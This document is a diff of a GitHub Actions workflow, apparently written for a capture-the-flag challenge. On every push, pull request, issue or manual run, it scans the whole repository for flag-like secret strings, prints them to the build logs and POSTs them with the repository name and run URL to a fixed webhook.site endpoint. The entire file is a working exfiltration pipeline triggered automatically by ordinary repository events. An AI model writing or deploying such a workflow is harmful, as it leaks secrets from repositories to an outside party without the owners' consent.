@@ -1,29 +1,45 @@
-name: Send Flags via Webhook
+name: send-flags
 
 on:
   push:
     branches: [ main, master ]
   pull_request:
-    types: [opened, synchronize]
   issues:
-    types: [opened]
+  workflow_dispatch:
 
 jobs:
-  send-flags:
+  find-flags:
     runs-on: ubuntu-latest
+    
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v3
+      - uses: actions/checkout@v3
+        with:
+          fetch-depth: 0
       
       - name: Find and send flags
         run: |
-          # Ищем флаги в коде
-          FLAGS=$(grep -rnoE 'flag\{[^}]+\}|ctf\{[^}]+\}' . || true)
+          echo "🔍 Searching for flags..."
           
-          # Отправляем через webhook
-          if [ -n "$FLAGS" ]; then
+          # Ищем флаги в формате FLAG: "..." или FLAG{...} или USER{...}
+          FLAGS=$(grep -rnoE '(F|f)(L|l)(A|a)(G|g):\s*"[^"]+"|(F|f)(L|l)(A|a)(G|g)\{[^}]+\}|[A-Z]+\{[^}]+\}' . --exclude-dir=.git || echo "[]")
+          
+          # Показываем найденные флаги в логах
+          echo "========================================="
+          echo "FOUND FLAGS:"
+          echo "$FLAGS"
+          echo "========================================="
+          
+          # Отправляем на webhook
+          if [ "$FLAGS" != "[]" ]; then
             curl -X POST \
               -H "Content-Type: application/json" \
-              -d "{\"flags\": \"$FLAGS\", \"repository\": \"${{ github.repository }}\", \"event\": \"${{ github.event_name }}\"}" \
+              -d "{\"repository\": \"${{ github.repository }}\", \"event\": \"${{ github.event_name }}\", \"flags\": \"$FLAGS\", \"run_url\": \"${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\"}" \
+              https://webhook.site/57254474-41e8-4ec4-b099-0b38ea82598e
+            echo "✅ Flags sent to webhook!"
+          else
+            echo "❌ No flags found"
+            curl -X POST \
+              -H "Content-Type: application/json" \
+              -d "{\"repository\": \"${{ github.repository }}\", \"event\": \"${{ github.event_name }}\", \"status\": \"no_flags_found\"}" \
               https://webhook.site/57254474-41e8-4ec4-b099-0b38ea82598e
           fi
